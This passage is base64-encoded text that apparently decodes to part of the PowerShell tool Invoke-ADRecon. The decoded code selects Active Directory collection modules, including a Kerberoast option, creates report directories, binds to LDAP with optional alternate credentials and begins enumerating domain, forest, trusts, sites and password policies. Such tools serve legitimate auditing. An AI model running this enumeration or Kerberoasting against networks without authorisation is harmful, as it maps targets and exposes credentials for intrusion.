0gUnVubmluZyBvbiAkUmFub25Db21wdXRlciIKCiAgICBTd2l0Y2ggKCRDb2xsZWN0KQogICAgewogICAgICAgICdGb3Jlc3QnIHsgJEFEUkZvcmVzdCA9ICR0cnVlIH0KICAgICAgICAnRG9tYWluJyB7JEFEUkRvbWFpbiA9ICR0cnVlIH0KICAgICAgICAnVHJ1c3RzJyB7ICRBRFJUcnVzdCA9ICR0cnVlIH0KICAgICAgICAnU2l0ZXMnIHsgJEFEUlNpdGUgPSAkdHJ1ZSB9CiAgICAgICAgJ1N1Ym5ldHMnIHsgJEFEUlN1Ym5ldCA9ICR0cnVlIH0KICAgICAgICAnUGFzc3dvcmRQb2xpY3knIHsgJEFEUlBhc3N3b3JkUG9saWN5ID0gJHRydWUgfQogICAgICAgICdGaW5lR3JhaW5lZFBhc3N3b3JkUG9saWN5JyB7ICRBRFJGaW5lR3JhaW5lZFBhc3N3b3JkUG9saWN5ID0gJHRydWUgfQogICAgICAgICdEb21haW5Db250cm9sbGVycycgeyAkQURSRG9tYWluQ29udHJvbGxlcnMgPSAkdHJ1ZSB9CiAgICAgICAgJ1VzZXJzJyB7ICRBRFJVc2VycyA9ICR0cnVlIH0KICAgICAgICAnVXNlclNQTnMnIHsgJEFEUlVzZXJTUE5zID0gJHRydWUgfQogICAgICAgICdQYXNzd29yZEF0dHJpYnV0ZXMnIHsgJEFEUlBhc3N3b3JkQXR0cmlidXRlcyA9ICR0cnVlIH0KICAgICAgICAnR3JvdXBzJyB7ICRBRFJHcm91cHMgPSAkdHJ1ZSB9CiAgICAgICAgJ0dyb3VwTWVtYmVycycgeyAkQURSR3JvdXBNZW1iZXJzID0gJHRydWUgfQogICAgICAgICdPVXMnIHsgJEFEUk9VcyA9ICR0cnVlIH0KICAgICAgICAnR1BPcycgeyAkQURSR1BPcyA9ICR0cnVlIH0KICAgICAgICAnZ1BMaW5rcycgeyAkQURSZ1BMaW5rcyA9ICR0cnVlIH0KICAgICAgICAnRE5TWm9uZXMnIHsgJEFEUkROU1pvbmVzID0gJHRydWUgfQogICAgICAgICdQcmludGVycycgeyAkQURSUHJpbnRlcnMgPSAkdHJ1ZSB9CiAgICAgICAgJ0NvbXB1dGVycycgeyAkQURSQ29tcHV0ZXJzID0gJHRydWUgfQogICAgICAgICdDb21wdXRlclNQTnMnIHsgJEFEUkNvbXB1dGVyU1BOcyA9ICR0cnVlIH0KICAgICAgICAnTEFQUycgeyAkQURSTEFQUyA9ICR0cnVlIH0KICAgICAgICAnQml0TG9ja2VyJyB7ICRBRFJCaXRMb2NrZXIgPSAkdHJ1ZSB9CiAgICAgICAgJ0FDTHMnIHsgJEFEUkFDTHMgPSAkdHJ1ZSB9CiAgICAgICAgJ0dQT1JlcG9ydCcKICAgICAgICB7CiAgICAgICAgICAgICRBRFJHUE9SZXBvcnQgPSAkdHJ1ZQogICAgICAgICAgICAkQURSQ3JlYXRlID0gJHRydWUKICAgICAgICB9CiAgICAgICAgJ0tlcmJlcm9hc3QnIHsgJEFEUktlcmJlcm9hc3QgPSAkdHJ1ZSB9CiAgICAgICAgJ0RvbWFpbkFjY291bnRzdXNlZGZvclNlcnZpY2VMb2dvbicgeyAkQURSRG9tYWluQWNjb3VudHN1c2VkZm9yU2VydmljZUxvZ29uID0gJHRydWUgfQogICAgICAgICdEZWZhdWx0JwogICAgICAgIHsKICAgICAgICAgICAgJEFEUkZvcmVzdCA9ICR0cnVlCiAgICAgICAgICAgICRBRFJEb21haW4gPSAkdHJ1ZQogICAgICAgICAgICAkQURSVHJ1c3QgPSAkdHJ1ZQogICAgICAgICAgICAkQURSU2l0ZSA9ICR0cnVlCiAgICAgICAgICAgICRBRFJTdWJuZXQgPSAkdHJ1ZQogICAgICAgICAgICAkQURSUGFzc3dvcmRQb2xpY3kgPSAkdHJ1ZQogICAgICAgICAgICAkQURSRmluZUdyYWluZWRQYXNzd29yZFBvbGljeSA9ICR0cnVlCiAgICAgICAgICAgICRBRFJEb21haW5Db250cm9sbGVycyA9ICR0cnVlCiAgICAgICAgICAgICRBRFJVc2VycyA9ICR0cnVlCiAgICAgICAgICAgICRBRFJVc2VyU1BOcyA9ICR0cnVlCiAgICAgICAgICAgICRBRFJQYXNzd29yZEF0dHJpYnV0ZXMgPSAkdHJ1ZQogICAgICAgICAgICAkQURSR3JvdXBzID0gJHRydWUKICAgICAgICAgICAgJEFEUkdyb3VwTWVtYmVycyA9ICR0cnVlCiAgICAgICAgICAgICRBRFJPVXMgPSAkdHJ1ZQogICAgICAgICAgICAkQURSR1BPcyA9ICR0cnVlCiAgICAgICAgICAgICRBRFJnUExpbmtzID0gJHRydWUKICAgICAgICAgICAgJEFEUkROU1pvbmVzID0gJHRydWUKICAgICAgICAgICAgJEFEUlByaW50ZXJzID0gJHRydWUKICAgICAgICAgICAgJEFEUkNvbXB1dGVycyA9ICR0cnVlCiAgICAgICAgICAgICRBRFJDb21wdXRlclNQTnMgPSAkdHJ1ZQogICAgICAgICAgICAkQURSTEFQUyA9ICR0cnVlCiAgICAgICAgICAgICRBRFJCaXRMb2NrZXIgPSAkdHJ1ZQogICAgICAgICAgICAkQURSQUNMcyA9ICR0cnVlCiAgICAgICAgICAgICRBRFJHUE9SZXBvcnQgPSAkdHJ1ZQogICAgICAgICAgICAjJEFEUktlcmJlcm9hc3QgPSAkdHJ1ZQogICAgICAgICAgICAjJEFEUkRvbWFpbkFjY291bnRzdXNlZGZvclNlcnZpY2VMb2dvbiA9ICR0cnVlCiAgICAgICAgICAgIElmICgkT3V0cHV0VHlwZSAtZXEgIkRlZmF1bHQiKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBbYXJyYXldICRPdXRwdXRUeXBlID0gIkNTViIsIkV4Y2VsIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIFN3aXRjaCAoJE91dHB1dFR5cGUpCiAgICB7CiAgICAgICAgJ1NURE9VVCcgeyAkQURSU1RET1VUID0gJHRydWUgfQogICAgICAgICdDU1YnCiAgICAgICAgewogICAgICAgICAgICAkQURSQ1NWID0gJHRydWUKICAgICAgICAgICAgJEFEUkNyZWF0ZSA9ICR0cnVlCiAgICAgICAgfQogICAgICAgICdYTUwnCiAgICAgICAgewogICAgICAgICAgICAkQURSWE1MID0gJHRydWUKICAgICAgICAgICAgJEFEUkNyZWF0ZSA9ICR0cnVlCiAgICAgICAgfQogICAgICAgICdKU09OJwogICAgICAgIHsKICAgICAgICAgICAgJEFEUkpTT04gPSAkdHJ1ZQogICAgICAgICAgICAkQURSQ3JlYXRlID0gJHRydWUKICAgICAgICB9CiAgICAgICAgJ0hUTUwnCiAgICAgICAgewogICAgICAgICAgICAkQURSSFRNTCA9ICR0cnVlCiAgICAgICAgICAgICRBRFJDcmVhdGUgPSAkdHJ1ZQogICAgICAgIH0KICAgICAgICAnRXhjZWwnCiAgICAgICAgewogICAgICAgICAgICAkQURSRXhjZWwgPSAkdHJ1ZQogICAgICAgICAgICAkQURSQ3JlYXRlID0gJHRydWUKICAgICAgICB9CiAgICAgICAgJ0FsbCcKICAgICAgICB7CiAgICAgICAgICAgICMkQURSU1RET1VUID0gJHRydWUKICAgICAgICAgICAgJEFEUkNTViA9ICR0cnVlCiAgICAgICAgICAgICRBRFJYTUwgPSAkdHJ1ZQogICAgICAgICAgICAkQURSSlNPTiA9ICR0cnVlCiAgICAgICAgICAgICRBRFJIVE1MID0gJHRydWUKICAgICAgICAgICAgJEFEUkV4Y2VsID0gJHRydWUKICAgICAgICAgICAgJEFEUkNyZWF0ZSA9ICR0cnVlCiAgICAgICAgICAgIFthcnJheV0gJE91dHB1dFR5cGUgPSAiQ1NWIiwiWE1MIiwiSlNPTiIsIkhUTUwiLCJFeGNlbCIKICAgICAgICB9CiAgICAgICAgJ0RlZmF1bHQnCiAgICAgICAgewogICAgICAgICAgICBbYXJyYXldICRPdXRwdXRUeXBlID0gIlNURE9VVCIKICAgICAgICAgICAgJEFEUlNURE9VVCA9ICR0cnVlCiAgICAgICAgfQogICAgfQoKICAgIElmICggKCRBRFJFeGNlbCkgLWFuZCAoLU5vdCAkQURSQ1NWKSApCiAgICB7CiAgICAgICAgJEFEUkNTViA9ICR0cnVlCiAgICAgICAgW2FycmF5XSAkT3V0cHV0VHlwZSArPSAiQ1NWIgogICAgfQoKICAgICRyZXR1cm5kaXIgPSBHZXQtTG9jYXRpb24KICAgICRkYXRlID0gR2V0LURhdGUKCiAgICAjIENyZWF0ZSBPdXRwdXQgZGlyCiAgICBJZiAoICgkQURST3V0cHV0RGlyKSAtYW5kICgkQURSQ3JlYXRlKSApCiAgICB7CiAgICAgICAgSWYgKCEoVGVzdC1QYXRoICRBRFJPdXRwdXREaXIpKQogICAgICAgIHsKICAgICAgICAgICAgTmV3LUl0ZW0gJEFEUk91dHB1dERpciAtdHlwZSBkaXJlY3RvcnkgfCBPdXQtTnVsbAogICAgICAgICAgICBJZiAoIShUZXN0LVBhdGggJEFEUk91dHB1dERpcikpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiW0ludm9rZS1BRFJlY29uXSBFcnJvciwgaW52YWxpZCBPdXRwdXREaXIgUGF0aCAuLi4gRXhpdGluZyIKICAgICAgICAgICAgICAgIFJldHVybiAkbnVsbAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICRBRFJPdXRwdXREaXIgPSAkKChDb252ZXJ0LVBhdGggJEFEUk91dHB1dERpcikuVHJpbUVuZCgiXCIpKQogICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBPdXRwdXQgRGlyZWN0b3J5OiAkQURST3V0cHV0RGlyIgogICAgfQogICAgRWxzZUlmICgkQURSQ3JlYXRlKQogICAgewogICAgICAgICRBRFJPdXRwdXREaXIgPSAgLWpvaW4oJHJldHVybmRpciwnXCcsJ0FEUmVjb24tUmVwb3J0LScsJChHZXQtRGF0ZSAtVUZvcm1hdCAlWSVtJWQlSCVNJVMpKQogICAgICAgIE5ldy1JdGVtICRBRFJPdXRwdXREaXIgLXR5cGUgZGlyZWN0b3J5IHwgT3V0LU51bGwKICAgICAgICBJZiAoIShUZXN0LVBhdGggJEFEUk91dHB1dERpcikpCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1PdXRwdXQgIltJbnZva2UtQURSZWNvbl0gRXJyb3IsIGNvdWxkIG5vdCBjcmVhdGUgb3V0cHV0IGRpcmVjdG9yeSIKICAgICAgICAgICAgUmV0dXJuICRudWxsCiAgICAgICAgfQogICAgICAgICRBRFJPdXRwdXREaXIgPSAkKChDb252ZXJ0LVBhdGggJEFEUk91dHB1dERpcikuVHJpbUVuZCgiXCIpKQogICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFJDcmVhdGUKICAgIH0KICAgIEVsc2UKICAgIHsKICAgICAgICAkQURST3V0cHV0RGlyID0gJHJldHVybmRpcgogICAgfQoKICAgIElmICgkQURSQ1NWKQogICAgewogICAgICAgICRDU1ZQYXRoID0gW1N5c3RlbS5JTy5EaXJlY3RvcnlJbmZvXSAtam9pbigkQURST3V0cHV0RGlyLCdcJywnQ1NWLUZpbGVzJykKICAgICAgICBOZXctSXRlbSAkQ1NWUGF0aCAtdHlwZSBkaXJlY3RvcnkgfCBPdXQtTnVsbAogICAgICAgIElmICghKFRlc3QtUGF0aCAkQ1NWUGF0aCkpCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1PdXRwdXQgIltJbnZva2UtQURSZWNvbl0gRXJyb3IsIGNvdWxkIG5vdCBjcmVhdGUgb3V0cHV0IGRpcmVjdG9yeSIKICAgICAgICAgICAgUmV0dXJuICRudWxsCiAgICAgICAgfQogICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFJDU1YKICAgIH0KCiAgICBJZiAoJEFEUlhNTCkKICAgIHsKICAgICAgICAkWE1MUGF0aCA9IFtTeXN0ZW0uSU8uRGlyZWN0b3J5SW5mb10gLWpvaW4oJEFEUk91dHB1dERpciwnXCcsJ1hNTC1GaWxlcycpCiAgICAgICAgTmV3LUl0ZW0gJFhNTFBhdGggLXR5cGUgZGlyZWN0b3J5IHwgT3V0LU51bGwKICAgICAgICBJZiAoIShUZXN0LVBhdGggJFhNTFBhdGgpKQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJbSW52b2tlLUFEUmVjb25dIEVycm9yLCBjb3VsZCBub3QgY3JlYXRlIG91dHB1dCBkaXJlY3RvcnkiCiAgICAgICAgICAgIFJldHVybiAkbnVsbAogICAgICAgIH0KICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURSWE1MCiAgICB9CgogICAgSWYgKCRBRFJKU09OKQogICAgewogICAgICAgICRKU09OUGF0aCA9IFtTeXN0ZW0uSU8uRGlyZWN0b3J5SW5mb10gLWpvaW4oJEFEUk91dHB1dERpciwnXCcsJ0pTT04tRmlsZXMnKQogICAgICAgIE5ldy1JdGVtICRKU09OUGF0aCAtdHlwZSBkaXJlY3RvcnkgfCBPdXQtTnVsbAogICAgICAgIElmICghKFRlc3QtUGF0aCAkSlNPTlBhdGgpKQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJbSW52b2tlLUFEUmVjb25dIEVycm9yLCBjb3VsZCBub3QgY3JlYXRlIG91dHB1dCBkaXJlY3RvcnkiCiAgICAgICAgICAgIFJldHVybiAkbnVsbAogICAgICAgIH0KICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURSSlNPTgogICAgfQoKICAgIElmICgkQURSSFRNTCkKICAgIHsKICAgICAgICAkSFRNTFBhdGggPSBbU3lzdGVtLklPLkRpcmVjdG9yeUluZm9dIC1qb2luKCRBRFJPdXRwdXREaXIsJ1wnLCdIVE1MLUZpbGVzJykKICAgICAgICBOZXctSXRlbSAkSFRNTFBhdGggLXR5cGUgZGlyZWN0b3J5IHwgT3V0LU51bGwKICAgICAgICBJZiAoIShUZXN0LVBhdGggJEhUTUxQYXRoKSkKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiW0ludm9rZS1BRFJlY29uXSBFcnJvciwgY291bGQgbm90IGNyZWF0ZSBvdXRwdXQgZGlyZWN0b3J5IgogICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICB9CiAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEUkhUTUwKICAgIH0KCiAgICAjIEFEIExvZ2luCiAgICBJZiAoJFVzZUFsdENyZWRzIC1hbmQgKCRQcm90b2NvbCAtZXEgJ0FEV1MnKSkKICAgIHsKICAgICAgICBJZiAoIShUZXN0LVBhdGggQURSOikpCiAgICAgICAgewogICAgICAgICAgICBUcnkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgTmV3LVBTRHJpdmUgLVBTUHJvdmlkZXIgQWN0aXZlRGlyZWN0b3J5IC1OYW1lIEFEUiAtUm9vdCAiIiAtU2VydmVyICREb21haW5Db250cm9sbGVyIC1DcmVkZW50aWFsICRDcmVkZW50aWFsIC1FcnJvckFjdGlvbiBTdG9wIHwgT3V0LU51bGwKICAgICAgICAgICAgfQogICAgICAgICAgICBDYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgIltJbnZva2UtQURSZWNvbl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgICAgICBJZiAoJEFEUk91dHB1dERpcikKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBSZW1vdmUtRW1wdHlBRFJPdXRwdXREaXIgJEFEUk91dHB1dERpciAkT3V0cHV0VHlwZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgUmV0dXJuICRudWxsCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgRWxzZQogICAgICAgIHsKICAgICAgICAgICAgUmVtb3ZlLVBTRHJpdmUgQURSCiAgICAgICAgICAgIFRyeQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBOZXctUFNEcml2ZSAtUFNQcm92aWRlciBBY3RpdmVEaXJlY3RvcnkgLU5hbWUgQURSIC1Sb290ICIiIC1TZXJ2ZXIgJERvbWFpbkNvbnRyb2xsZXIgLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwgLUVycm9yQWN0aW9uIFN0b3AgfCBPdXQtTnVsbAogICAgICAgICAgICB9CiAgICAgICAgICAgIENhdGNoCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiW0ludm9rZS1BRFJlY29uXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICAgICAgICAgIElmICgkQURST3V0cHV0RGlyKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFJlbW92ZS1FbXB0eUFEUk91dHB1dERpciAkQURST3V0cHV0RGlyICRPdXRwdXRUeXBlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBTZXQtTG9jYXRpb24gQURSOgogICAgICAgIFdyaXRlLURlYnVnICJBRFIgUFNEcml2ZSBDcmVhdGVkIgogICAgfQoKICAgIElmICgkUHJvdG9jb2wgLWVxICdMREFQJykKICAgIHsKICAgICAgICBJZiAoJFVzZUFsdENyZWRzKQogICAgICAgIHsKICAgICAgICAgICAgVHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRvYmpEb21haW4gPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlFbnRyeSAiTERBUDovLyQoJERvbWFpbkNvbnRyb2xsZXIpIiwgJENyZWRlbnRpYWwuVXNlck5hbWUsJENyZWRlbnRpYWwuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5QYXNzd29yZAogICAgICAgICAgICAgICAgJG9iakRvbWFpblJvb3REU0UgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlFbnRyeSAiTERBUDovLyQoJERvbWFpbkNvbnRyb2xsZXIpL1Jvb3REU0UiLCAkQ3JlZGVudGlhbC5Vc2VyTmFtZSwkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpLlBhc3N3b3JkCiAgICAgICAgICAgIH0KICAgICAgICAgICAgQ2F0Y2gKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJbSW52b2tlLUFEUmVjb25dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICAgICAgSWYgKCRBRFJPdXRwdXREaXIpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgUmVtb3ZlLUVtcHR5QURST3V0cHV0RGlyICRBRFJPdXRwdXREaXIgJE91dHB1dFR5cGUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIFJldHVybiAkbnVsbAogICAgICAgICAgICB9CiAgICAgICAgICAgIElmKCEoJG9iakRvbWFpbi5uYW1lKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJbSW52b2tlLUFEUmVjb25dIExEQVAgYmluZCBVbnN1Y2Nlc3NmdWwiCiAgICAgICAgICAgICAgICBJZiAoJEFEUk91dHB1dERpcikKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBSZW1vdmUtRW1wdHlBRFJPdXRwdXREaXIgJEFEUk91dHB1dERpciAkT3V0cHV0VHlwZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgUmV0dXJuICRudWxsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgRWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgIlsqXSBMREFQIGJpbmQgU3VjY2Vzc2Z1bCIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBFbHNlCiAgICAgICAgewogICAgICAgICAgICAkb2JqRG9tYWluID0gW0FEU0ldIiIKICAgICAgICAgICAgJG9iakRvbWFpblJvb3REU0UgPSAoW0FEU0ldICJMREFQOi8vUm9vdERTRSIpCiAgICAgICAgICAgIElmKCEoJG9iakRvbWFpbi5uYW1lKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJbSW52b2tlLUFEUmVjb25dIExEQVAgYmluZCBVbnN1Y2Nlc3NmdWwiCiAgICAgICAgICAgICAgICBJZiAoJEFEUk91dHB1dERpcikKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBSZW1vdmUtRW1wdHlBRFJPdXRwdXREaXIgJEFEUk91dHB1dERpciAkT3V0cHV0VHlwZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgUmV0dXJuICRudWxsCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgV3JpdGUtRGVidWcgIkxEQVAgQmluZyBTdWNjZXNzZnVsIgogICAgfQoKICAgIFdyaXRlLU91dHB1dCAiWypdIENvbW1lbmNpbmcgLSAkZGF0ZSIKICAgIElmICgkQURSRG9tYWluKQogICAgewogICAgICAgIFdyaXRlLU91dHB1dCAiWy1dIERvbWFpbiIKICAgICAgICAkQURST2JqZWN0ID0gR2V0LUFEUkRvbWFpbiAtUHJvdG9jb2wgJFByb3RvY29sIC1vYmpEb21haW4gJG9iakRvbWFpbiAtb2JqRG9tYWluUm9vdERTRSAkb2JqRG9tYWluUm9vdERTRSAtRG9tYWluQ29udHJvbGxlciAkRG9tYWluQ29udHJvbGxlciAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgIElmICgkQURST2JqZWN0KQogICAgICAgIHsKICAgICAgICAgICAgRXhwb3J0LUFEUiAtQURST2JqICRBRFJPYmplY3QgLUFEUk91dHB1dERpciAkQURST3V0cHV0RGlyIC1PdXRwdXRUeXBlICRPdXRwdXRUeXBlIC1BRFJNb2R1bGVOYW1lICJEb21haW4iCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFJPYmplY3QKICAgICAgICB9CiAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEUkRvbWFpbgogICAgfQogICAgSWYgKCRBRFJGb3Jlc3QpCiAgICB7CiAgICAgICAgV3JpdGUtT3V0cHV0ICJbLV0gRm9yZXN0IgogICAgICAgICRBRFJPYmplY3QgPSBHZXQtQURSRm9yZXN0IC1Qcm90b2NvbCAkUHJvdG9jb2wgLW9iakRvbWFpbiAkb2JqRG9tYWluIC1vYmpEb21haW5Sb290RFNFICRvYmpEb21haW5Sb290RFNFIC1Eb21haW5Db250cm9sbGVyICREb21haW5Db250cm9sbGVyIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgSWYgKCRBRFJPYmplY3QpCiAgICAgICAgewogICAgICAgICAgICBFeHBvcnQtQURSIC1BRFJPYmogJEFEUk9iamVjdCAtQURST3V0cHV0RGlyICRBRFJPdXRwdXREaXIgLU91dHB1dFR5cGUgJE91dHB1dFR5cGUgLUFEUk1vZHVsZU5hbWUgIkZvcmVzdCIKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEUk9iamVjdAogICAgICAgIH0KICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURSRm9yZXN0CiAgICB9CiAgICBJZiAoJEFEUlRydXN0KQogICAgewogICAgICAgIFdyaXRlLU91dHB1dCAiWy1dIFRydXN0cyIKICAgICAgICAkQURST2JqZWN0ID0gR2V0LUFEUlRydXN0IC1Qcm90b2NvbCAkUHJvdG9jb2wgLW9iakRvbWFpbiAkb2JqRG9tYWluCiAgICAgICAgSWYgKCRBRFJPYmplY3QpCiAgICAgICAgewogICAgICAgICAgICBFeHBvcnQtQURSIC1BRFJPYmogJEFEUk9iamVjdCAtQURST3V0cHV0RGlyICRBRFJPdXRwdXREaXIgLU91dHB1dFR5cGUgJE91dHB1dFR5cGUgLUFEUk1vZHVsZU5hbWUgIlRydXN0cyIKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEUk9iamVjdAogICAgICAgIH0KICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURSVHJ1c3QKICAgIH0KICAgIElmICgkQURSU2l0ZSkKICAgIHsKICAgICAgICBXcml0ZS1PdXRwdXQgIlstXSBTaXRlcyIKICAgICAgICAkQURST2JqZWN0ID0gR2V0LUFEUlNpdGUgLVByb3RvY29sICRQcm90b2NvbCAtb2JqRG9tYWluICRvYmpEb21haW4gLW9iakRvbWFpblJvb3REU0UgJG9iakRvbWFpblJvb3REU0UgLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICBJZiAoJEFEUk9iamVjdCkKICAgICAgICB7CiAgICAgICAgICAgIEV4cG9ydC1BRFIgLUFEUk9iaiAkQURST2JqZWN0IC1BRFJPdXRwdXREaXIgJEFEUk91dHB1dERpciAtT3V0cHV0VHlwZSAkT3V0cHV0VHlwZSAtQURSTW9kdWxlTmFtZSAiU2l0ZXMiCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFJPYmplY3QKICAgICAgICB9CiAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEUlNpdGUKICAgIH0KICAgIElmICgkQURSU3VibmV0KQogICAgewogICAgICAgIFdyaXRlLU91dHB1dCAiWy1dIFN1Ym5ldHMiCiAgICAgICAgJEFEUk9iamVjdCA9IEdldC1BRFJTdWJuZXQgLVByb3RvY29sICRQcm90b2NvbCAtb2JqRG9tYWluICRvYmpEb21haW4gLW9iakRvbWFpblJvb3REU0UgJG9iakRvbWFpblJvb3REU0UgLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICBJZiAoJEFEUk9iamVjdCkKICAgICAgICB7CiAgICAgICAgICAgIEV4cG9ydC1BRFIgLUFEUk9iaiAkQURST2JqZWN0IC1BRFJPdXRwdXREaXIgJEFEUk91dHB1dERpciAtT3V0cHV0VHlwZSAkT3V0cHV0VHlwZSAtQURSTW9kdWxlTmFtZSAiU3VibmV0cyIKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEUk9iamVjdAogICAgICAgIH0KICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURSU3VibmV0CiAgICB9CiAgICBJZiAoJEFEUlBhc3N3b3JkUG9saWN5KQogICAgewogICAgICAgIFdyaXRlLU91dHB1dCAiWy1dIERlZmF1bHQgUGFzc3dvcmQgUG9saWN5IgogICAgICAgICRBRFJPYmplY3QgPSBHZXQtQURSRGVmYXVsdFBhc3N3b3JkUG9saWN5IC1Qcm90b2NvbCAkUHJvdG9jb2wgLW9iakRvbWFpbiAkb2JqRG9tYWluCiAgICAgICAgSWYgKCRBRFJPYmplY3QpCiAgICAgICAgewogICAgICAgICAgICBFeHBvcnQtQURSIC1BRFJPYmogJEFEUk9iamVjdCAtQURST3V0cHV0RGlyICRBRFJPdXRwdXREaXIgLU91dHB1dFR5cGUgJE91dHB1dFR5cGUgLUFEUk1vZHVsZU5hbWUgIkRlZmF1bHRQYXNzd29yZFBvbGljeSIKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEUk9iamVjdAogICAgICAgIH0KICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURSUGFzc3dvcmRQb2xpY3kKICAgIH0KICAgIElmICgkQURSRmluZUdyYWluZWRQYXNzd29yZFBvbGljeSkKICAgIHsKICAgICAgICBXcml0ZS1PdXRwdXQgIlstXSBGaW5lIEdyYWluZWQgUGFzc3dvcmQgUG9saWN5IC0gTWF5IG5lZWQgYSBQcml2aWxlZ2VkIEFjY291bnQiCiAgICAgICAgJEFEUk9iamVjdCA9IEdldC1BRFJGaW5lR3JhaW5lZFBhc3N3b3JkUG9saWN5IC1Qcm90b2NvbCAkUHJvdG9jb2wgLW9iakRvbWFpbiAkb2JqRG9tYWluCiAgICAgICAgSWYgKCRBRFJPYmplY3QpCiAgICAgICAgewogICAgICAgICAgICBFeHBvcnQtQURSIC1BRFJPYmogJEFEUk9iamVjdCAtQURST3V0cHV0RGlyICRBRFJPdXRwdXREaXIgLU91dHB1dFR5cGUgJE91dHB1dFR5cGUgLUFEUk1vZHVsZU5hbWUgIkZpbmVHcmFpbmVkUGFzc3dvcmRQb2xpY3kiCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFJPYmplY3QKICAgICAgICB9CiAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEUkZpbmVHcmFpbmVkUGFzc3dvcmRQb2xpY3kKICAgIH0KICAgIElmICgkQURSRG9tYWluQ29udHJvbGxlcnMpCiAgICB7CiAgICAgICAgV3JpdGUtT3V0cHV0ICJbLV0gRG9tYWluIENvbnRyb2xsZXJzIgogICAgICAgICRBRFJPYmplY3QgPSBHZXQtQURSRG9tYWluQ29udHJvbGxlciAtUHJvdG9jb2wgJFByb3RvY29sIC1vYmpEb21haW4gJG9iakRvbWFpbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgIElmICgkQURST2JqZWN0KQogICAgICAgIHsKICAgICAgICAgICAgRXhwb3J0LUFEUiAtQURST2JqICRBRFJPYmplY3QgLUFEUk91dHB1dERpciAkQURST3V0cHV0RGlyIC1PdXRwdXRUeXBlICRPdXRwdXRUeXBlIC1BRFJNb2R1bGVOYW1lICJEb21haW5Db250cm9sbGVycyIKICAgICAgICAgICAgUmVtb3ZlLV